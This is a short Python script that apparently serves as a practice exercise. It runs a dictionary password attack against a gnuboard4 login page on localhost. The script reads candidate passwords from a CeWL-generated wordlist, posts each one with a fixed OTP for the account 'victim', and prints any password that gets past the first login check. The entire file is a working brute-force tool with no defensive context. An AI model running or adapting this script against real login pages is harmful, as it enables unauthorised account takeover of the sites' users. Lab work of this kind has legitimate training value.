import requests

password = ''
def tryLogin(password):
    data = {'mb_id' : 'victim', 'mb_password' : password, 'otp':'123123'}
    r = requests.post("http://localhost/gnuboard4/bbs/login_check.php",data);
    r.encoding = 'utf-8'

    if "OTP" in r.text:
        print("password: ",password)

f = open("cewl_dvwa_password.txt", 'r')
while True:
    line = f.readline()
    line = line.strip()

    if not line: break

    tryLogin(line)
